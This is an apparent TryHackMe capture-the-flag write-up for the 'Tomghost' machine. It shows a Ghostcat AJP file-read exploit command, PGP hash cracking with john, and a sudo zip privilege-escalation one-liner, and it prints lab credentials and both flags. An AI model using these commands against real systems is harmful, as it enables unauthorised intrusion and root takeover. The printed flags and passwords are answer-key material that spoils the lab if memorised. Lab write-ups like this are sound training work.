# TOMGHOST

## BASIC INFO
```
export IP=10.10.179.57
```


> - **Compromise this machine and obtain user.txt**
>> THM{GhostCat_1s_so_cr4sy}

> - **Escalate privileges and obtain root.txt**
>> THM{Z1P_1S_FAKE}

From the name and some google search we can pin point the vulnerabilit of this machine. It is Ghostcat. Using the [script](ajpShooter.py) we can obtain the first credentials. Run `./ajpShooter.py $IP:8080 8009 /WEB_INF/web.xml read` and the credentials should be just below.
```
skyfuck:8730281lkjlkjdqlksalks
```

ssh Into the machine with the credentials above. Then scp both file onto our host machine. Before cracking the hash with john we need to do `gpg2john tryhackme.asc > hash`.
```
tryhackme:alexandru
```

After cracking the hash we can use it to decrypt the pgp file. But first we need to import the secret key first. `gpg --import tryhackme.asc` then `gpg --decrypt credential.pgp`
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

Now ssh into the machine again using the new credential. The user.txt is just at his home directory.

Now for privilege escalation, it's the good'ol `sudo -l`. We can run zip as sudo without password.
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```
And we're root. Navigate to /root/ toget root.txt